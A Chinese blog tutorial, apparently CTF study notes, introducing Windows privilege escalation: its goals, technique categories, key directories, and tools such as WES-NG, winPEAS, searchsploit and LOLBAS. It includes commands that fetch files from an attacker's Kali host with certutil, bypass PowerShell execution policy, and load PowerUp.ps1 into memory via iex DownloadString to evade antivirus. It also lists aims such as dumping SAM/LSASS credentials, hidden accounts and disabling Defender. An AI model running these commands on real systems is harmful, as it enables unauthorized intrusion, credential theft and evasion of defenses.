---
title: Windows提权0：基础知识和好用的工具
date: 2026-03-21 6:00:00
tags:
- 提权
- Windows
- 基础知识
categories:
- ISW
- Windows提权
---

# 什么是Windows提权

和 Linux 类似，权限提升（Privilege escalation）是指利用操作系统、服务程序的配置缺陷或内核漏洞，来获取更高的控制权。

Windows 提权一般是指从普通用户（如 `User`）、网络服务用户（如 `NETWORK SERVICE` 或 `iis apppool`）提升到**本地管理员（Administrator）**，或者**系统最高权限**（NT AUTHORITY\SYSTEM）的操作过程。

**Windows提权的本质**也是信息收集，加上对系统内置服务、注册表配置机制的理解，以及对 Windows 特有机制（如令牌 Impersonation）的利用。
Windows提权目的
===========

为什么拿到 Webshell 还要提权？因为在 Windows 下，IIS 或 Apache 运行的权限通常极低

很多时候你甚至连 `C:\Users\` 目录都进不去，更别提抓取其他人的密码了。

**获取 SYSTEM 权限是内网漫游的起点。**

1. **读取服务器中的重要凭据（打内网必备）：**
   
   1. 读取 SAM 数据库（对应 Linux 的 `/etc/shadow`）获取本地密码哈希。
   
   2. 从 LSASS 内存中抓取明文密码（Mimikatz 的拿手好戏）。

2. **在系统中安置高权限后门：**
   
   1. 创建隐藏的影子账户。
   
   2. 修改注册表实现持久化（开机自启）。

3. **控制安全软件：**
   
   1. 只有高权限才能关闭 Windows Defender 或其他杀软（AV/EDR）。

Windows提权手法分类
=============

相比 Linux，Windows 的提权手法通常围绕着“系统服务”和“特权”展开：

* **配置错误的服务提权：** 类似于 Linux 的 SUID，管理员配置了以 SYSTEM 权限运行的服务，但对普通用户开放了修改服务执行路径（Unquoted Service Path）或替换可执行文件的权限。

* **令牌窃取：** Windows 特有的漏洞，低权限的服务账户往往拥有“模拟客户端”的特权（SeImpersonatePrivilege），通过“土豆家族（Potato Exploits）”可以骗取 SYSTEM 令牌。

* **注册表与自动登录凭据：** 管理员可能在注册表、无人值守安装文件（Unattended Installs）或凭据管理器中留下了明文密码。

* **内核漏洞：** 类似于 Linux 的 DirtyCow，Windows 也有大量的本地提权漏洞（如 CVE-2023-21768）。

Windows目录结构初识（对标Linux）：
=======================

理解 Windows 的目录结构，能帮你了解exp该放在哪打，以及寻找配置缺陷的重灾区。

## C:\Program Files

* **Linux 对标**：`/opt`

* **用途**：系统安装第三方软件的地方。`x86` 存放 32 位软件。

* **在Windows提权中的意义**：
  
  * **寻找服务漏洞**：很多第三方软件（如杀软、MySQL、特定的企业应用）会在这里注册以 SYSTEM 运行的后台服务。如果这些文件夹权限配置不当（普通用户可写），直接替换里面的 `.exe` 就能提权。

C:\Windows\Temp 与 C:\Users\Public
---------------------------------

* **Linux 对标**：`/tmp` 与 `/dev/shm`

* **用途**：系统的临时文件夹与公共用户文件夹。

* **渗透意义**：
  
  * **全员可写**：在 IIS 的极低权限下，你可能无法在 Web 目录写文件，但这两个目录几乎对所有用户开放 `读/写/执行` 权限。
  
  * **投递 EXP**：这是你上传 `PrintSpoofer.exe` 或提权脚本的**首选存放地**。

C:\Windows\System32\config 与 C:\Users*\AppData
----------------------------------------------

* **Linux 对标**：`/etc`

* **用途**：`config` 存放注册表核心文件（SAM、SYSTEM），`AppData` 存放用户的应用配置。

* **渗透意义**：
  
  * 如果你能拿到 `config` 下的**SAM 文件**，提权就结束了一半。
  
  * 在 `AppData` 中经常能翻到运维人员留下的 Xshell 密码、浏览器记住的密码等。

C:\Windows\System32
-------------------

* **Linux 对标**：`/bin` 与 `/usr/bin`

* **用途**：存放系统原生二进制文件（`cmd.exe`, `net.exe`, `certutil.exe` 等）。

* **渗透意义**：
  
  * 我们利用这里的合法程序来绕过杀软，或者进行文件下载、执行代码。

C:\inetpub\wwwroot
------------------

* **Linux 对标**：`/var/www/html`

* **用途**：Windows IIS 服务器的默认 Web 根目录。

* **渗透意义**：
  
  * **翻找代码**：重点寻找 `web.config` 文件，里面常常写死了连接 SQL Server 数据库的高权限账号密码。

总结
----

1. **想传 EXP 到靶机**：去 `C:\Windows\Temp` 或 `C:\Users\Public`。

2. **找第三方脆弱服务**：去 `C:\Program Files`。

3. **找Web配置文件**：去 `C:\inetpub\wwwroot`。
   
   

# Windows提权过程中可能用到的知识查询书和好用的工具



## CMD 与 PowerShell 命令集

必须掌握 CMD 和 PowerShell 的基础命令，不过不用掌握太多

PowerShell 很多linux里的命令依旧可以用，我们只需要记住下面这个表和一些常用命令就行了

如果靶机有powershell尽量用powershell

| 操作目标        | Linux 习惯           | CMD (纯 DOS 环境)                                                       | PowerShell 环境                                                      |
| ----------- | ------------------ | -------------------------------------------------------------------- | ------------------------------------------------------------------ |
| **查看文件内容**  | `cat file`         | `type file`                                                          | `cat file` 或 `Get-Content file`                                    |
| **列出隐藏文件**  | `ls -la`           | `dir /a`                                                             | `ls -Force`                                                        |
| **搜索文件内容**  | `grep "pass" file` | `findstr "pass" file`                                                | `Select-String "pass" file`                                        |
| **下载文件**    | `wget http://...`  | `certutil.exe -urlcache -split -f "http://127.0.0.1/winPEASany.exe"` | `wget "http://..." -OutFile 1.exe` 或 `iwr -Uri "..." -OutFile ...` |
| **看系统环境变量** | `env`              | `set`                                                                | `dir env:` 或 `Get-ChildItem Env:`                                  |

### 突破限制进入 PowerShell (在 CMD 中执行)

很多时候系统的 PowerShell 默认禁止运行脚本（Execution Policy）。我们用这条命令绕过限制，启动一个干净、无弹窗的 PowerShell：

```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
```

如果输入 `powershell` 提示“不是内部或外部命令”，试试**绝对路径**。有时候环境变量里没写，但文件还在硬盘里

**64位系统路径：** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

**32位系统路径：** `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`

### CMD 下的万能下载器 (Certutil)

如果机器上没装杀软，你在 CMD 下想从自己的 Kali 下载 `winpeas.exe` 怎么弄？用 Windows 自带的证书工具：

```cmd
certutil.exe -urlcache -split -f "http://你的kali-IP/winpeas.exe" winpeas.exe
```

### PowerShell 内存加载脚本（免杀执行）

如果你想运行提权脚本（比如 `PowerUp.ps1`），不要下载到硬盘上（容易被删或被杀），直接在内存里执行：

```powershell
iex (New-Object Net.WebClient).DownloadString('http://攻击kali-IP/PowerUp.ps1')
```





Exploit-DB 与 searchsploit
--------------------------------

和 Linux 提权一样，EDB 里同样包含了大量的 Windows 内核漏洞，和linux下使用没啥区别

例如：

**按版本搜：** `searchsploit "Windows 10" local privilege`

**按 CVE 编号搜：** `searchsploit CVE-2023-21768`

**只搜标题：** `searchsploit -t "Print Spooler"`

**配合 Grep 过滤：** `searchsploit windows local | grep "1803"`



WES-NG (Windows Exploit Suggester - Next Generation)
----------------------------------------------------

**Linux 对标：** `linux-exploit-suggester.sh (les.sh)`

**作用：** 基于目标 Windows 机器安装的补丁（KB号），预测可能存在的 CVE 内核漏洞。

### 区别与使用方法

**区别：**

在 Linux 中，你把 `les.sh` 传到靶机运行；

但在 Windows 中，**WES-NG 是 Python 写的，靶机通常没 Python，所以必须在攻击机上离线运行**

**使用流程：**

1. 在 Windows 靶机的 CMD 中执行以下命令，收集系统和补丁信息。
   
   ```shell
   systeminfo > sysinfo.txt
   ```

2. 把 `sysinfo.txt` 下载到你的 Kali 上。

3. 在 **攻击机** 上运行 **WES-NG** 工具进行比对。
   
   ```bash
   python3 wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
   ```
   
   注：
   
   `-i 'Elevation of Privilege'`：只看提权漏洞（过滤掉远程执行、拒绝服务等）。
   
   `--exploits-only`：只显示那些**在公网上已经公开了武器化 EXP** 的漏洞。

4. 阅读输出结果：
   
   - **看 `Exploits` 字段：** 如果这个字段为空，或者给的链接是个分析文章而不是代码，直接跳过！重点找那些链接里带有 `github` 并且提到有 `.exe` 或 `.ps1` 的。
   
   - **看 `CVE` 年份：** 优先打最新年份的漏洞（比如 2022、2023），老漏洞可能因为环境原因打不通。

5. 配合searchsploit 来打

### 下载：

```bash
git clone https://github.com/bitsadmin/wesng.git
```



## WinPEAS

**Linux 对标：** `Linpeas`

**作用：** 用于Windows 信息收集和本地枚举。它会扫描注册表、自动运行、服务权限、各种密码文件，并用颜色标记危险项。

### 下载：

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe
```

### 如何使用：

断网比赛，你需要把 `winPEASany.exe` 或 `winPEASx64.exe` 传到靶机的 `C:\Windows\Temp` 目录下执行。 

```cmd
C:\Windows\Temp\winPEASany.exe  //普通搜索
winPEASany.exe quiet cmd fast  //快速搜索
```

### 输出分析：

红色且带有高亮底色的输出，通常就是直接提权点

我们需要**重点看**下面这些：

#### 用户权限与令牌 (User Privileges)

- **关键词：** `SeImpersonatePrivilege`

- 如果你在服务器上看到这个特权开启（尤其是红色的），直接上“土豆家族”（PrintSpoofer 或 GodPotato）方法提权，成功率极高。

#### 弱服务权限 (Services Information)

* **关键词：** `Unquoted Service Paths` (未引用的服务路径) 或 `Service Permissions`。

* 服务器上跑着各种第三方服务。如果某个服务的路径没加引号，或者你对服务文件有写权限，这就是送分的提权点。

#### 注册表凭据 (Credentials in Registry)

* **关键词：** `AutoLogon`, `Putty`, `VNC`, `WinSCP`。

* 运维人员为了省事，经常把密码存在注册表里。WinPEAS 扫这一块非常快，如果有红字显示明文密码，直接提权就行了。

#### 补丁情况 (System Information)

* **关键词：** `Hotfixes`, `Kernel Vulnerabilities`。

* 这是最后没办法才用的招数。通过内核版本号去查 WES-NG，寻找类似 `CVE-2023-21768` 这种内核漏洞。



LOLBAS (Living Off The Land Binaries and Scripts)
-------------------------------------------------

**Linux 对标：** `GTFOBins`

**作用：** 记录了 Windows 系统自带的、有微软数字签名的合法程序，如何被黑客用来**下载文件、执行恶意代码或绕过杀软**的知识库。

### 下载：

和 GTFOBins 类似，它是一个静态网站项目。如果要打线下赛，你必须把它扒下来离线查看。

### 用法：

在左侧搜索框输入系统里常见的程序（如 `certutil`, `msiexec`, `bash`），它会告诉你如何利用这个程序去完成：执行、下载或绕过 UAC。


